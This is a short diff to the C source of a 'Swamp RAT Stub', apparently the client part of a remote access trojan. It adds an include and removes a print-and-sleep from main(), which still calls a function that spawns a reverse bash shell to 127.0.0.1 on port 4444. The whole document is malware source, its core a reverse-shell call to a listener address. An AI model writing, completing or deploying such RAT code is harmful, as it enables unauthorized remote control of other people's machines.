@@ -18,7 +18,7 @@
 #include <stdio.h>
 #include <string.h>
 #include "include/stub/shell.h"
-
+#include "include/stub/sys.h"
 void help_menu(){
   printf("Swamp RAT Stub!\n");
 }
@@ -26,7 +26,5 @@ void help_menu(){
 int main(){
   help_menu();
   shell_spawn_reverse_tcp("127.0.0.1", 4444, SHELL_BASH, SHELL_ASYNC_TRUE);
-  printf("hello\n");
-  sleep(5);
   return 0;
 }
